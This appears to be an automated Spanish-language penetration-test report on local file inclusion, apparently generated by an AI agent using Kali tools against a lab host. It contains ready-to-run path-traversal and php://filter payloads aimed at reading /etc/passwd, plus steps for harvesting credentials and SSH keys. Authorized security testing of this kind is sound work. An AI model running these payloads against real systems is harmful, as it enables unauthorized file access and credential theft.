# Informe de auditoría LFI — 2026-04-27T07:32:10

Objetivo: http://web.dev.local:8081
Auditor: Automated Kali/MCP workflow (laboratorio autorizado)

Resumen ejecutivo:
- Resultado actual: No se confirmó LFI explotable en esta iteración debido a fallos de conectividad con el servidor MCP durante las pruebas activas.
- Hallazgos iniciales: Enumeración de directorios devolvió /index.php (200) y /pages/ (301). Se detectaron rutas protegidas (.htaccess, .htpasswd, .hta) con 403.

Reconocimiento realizado:
- Se ejecutó "gobuster" (dir) contra http://web.dev.local:8081 usando /usr/share/wordlists/dirb/common.txt (resultado parcial obtenido desde la infraestructura MCP):
  - /.htpasswd (403)
  - /.hta (403)
  - /.htaccess (403)
  - /index.php (200)
  - /pages (301)
  - /server-status (403)

Pruebas de LFI y fuzzing intentadas:
- Comandos/Probes planeados (ejemplos exactos ejecutables en Kali):
  - gobuster dir -u http://web.dev.local:8081 -w /usr/share/wordlists/dirb/common.txt
  - ffuf -u "http://web.dev.local:8081/index.php?FUZZ=../../../../etc/passwd" -w /usr/share/wordlists/raft-large-directories.txt -mc 200,302,403
  - curl -s "http://web.dev.local:8081/index.php?page=../../../../etc/passwd" -D -
  - curl -s "http://web.dev.local:8081/index.php?file=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd"
  - wfuzz -c -z file,/usr/share/wordlists/Discovery/DNS/subdomains-top1million-5000.txt "http://web.dev.local:8081/index.php?FILE=FUZZ"

Ejecución real y errores encontrados durante la sesión:
- Se obtuvo salida válida de gobuster (ver arriba).
- Intentos posteriores de ejecutar comandos arbitrarios y curls a través del servidor MCP (para leer /etc/passwd con parámetros comunes como page, file, path, template, include, etc.) fallaron debido a que la conexión con el servicio MCP se perdió: "MCP server 'kali_mcp': Error: Not connected".
- Debido a esta desconexión no fue posible confirmar la lectura de ficheros sensibles (p.ej. /etc/passwd) ni explotar el LFI mediante php://filter o traversal adicional.

Conclusiones actuales:
- VULN_FOUND: No confirmado en esta iteración — hallazgos preliminares (index.php y /pages/) indican puntos de interés pero no constituyen prueba de LFI por sí mismos.
- VULN_EXPLOITED: No — no se logró leer ficheros sensibles del sistema ni escalar a RCE debido a la falta de conectividad en la fase de explotación.

Recomendaciones y siguientes pasos:
1. Restaurar la conectividad al servidor MCP o ejecutar las mismas pruebas desde una instancia con conectividad estable al objetivo.
2. Fuzzear parámetros comunes en index.php (page, file, view, template, include) usando ffuf/wfuzz con payloads de traversal (../../../../etc/passwd) y php wrappers (php://filter/read=convert.base64-encode/resource=FILE).
3. Si se logra lectura parcial de ficheros de la app (.env, config.php, backup.zip), proceder a:
   - Extraer contenido mediante php://filter convertido en base64 y decodificar localmente.
   - Buscar credenciales/SSH keys para avanzar a escalada o pivot.
4. Documentar y captar evidencias (salida completa de curl/ffuf) y repetir el informe con evidencias incrustadas.

Comandos exactos recomendados para reproducir (en Kali):
- ffuf -u "http://web.dev.local:8081/index.php?FUZZ=../../../../etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200
- curl -v "http://web.dev.local:8081/index.php?page=../../../../etc/passwd"
- curl -v "http://web.dev.local:8081/index.php?file=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd"

Impacto si se confirma:
- Acceso a ficheros sensibles de la aplicación y del sistema podría exponer credenciales, claves privadas o permitir posteriores escaladas a RCE y compromiso completo del host.

Anexo: registros y errores de la sesión
- Gobuster (ejecución en MCP) produjo la lista de rutas citada más arriba.
- Intentos de ejecución de comandos vía MCP fallaron con: "MCP server 'kali_mcp': Error: Not connected".

---
Fecha del informe: 2026-04-27T07:32:10
Generado por: entorno automatizado (Kali MCP via asistente)
